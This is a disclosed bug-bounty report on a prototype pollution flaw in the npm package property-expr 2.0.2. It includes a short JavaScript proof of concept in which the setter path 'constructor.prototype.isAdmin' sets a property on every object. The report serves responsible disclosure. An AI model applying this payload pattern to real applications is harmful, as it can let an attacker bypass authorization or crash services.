# property-expr - Prototype pollution

## Report Details
- **Report ID**: 910206
- **URL**: https://hackerone.com/reports/910206
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-06-28T09:57:18.435Z
- **Disclosed**: 2020-09-24T04:00:17.873Z

## Reporter
- **Username**: ahihi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Prototype pollution in property-expr
It allows attacker to modify the prototype of a base object.

# Module

**module name:** property-expr
**version:** 2.0.2
**npm page:** `https://www.npmjs.com/package/property-expr`

## Module Description

> Tiny property path utilities, including path parsing and metadata and deep property setters and getters

## Module Stats

> Replace stats below with numbers from npm’s module page:

[1,057,612] weekly downloads

# Vulnerability

## Vulnerability Description

> The functions setter can be tricked into modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Run the following code:
```
let expr = require('property-expr')
obj = {}
expr.setter('constructor.prototype.isAdmin')(obj,true)
console.log({}.isAdmin) // true
```
# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [Y/N]  N
- I opened an issue in the related repository: [Y/N] N

## Impact

Modify Object prototype can lead to Dos, RCE, change code logic flow.

## Attachments
No attachments
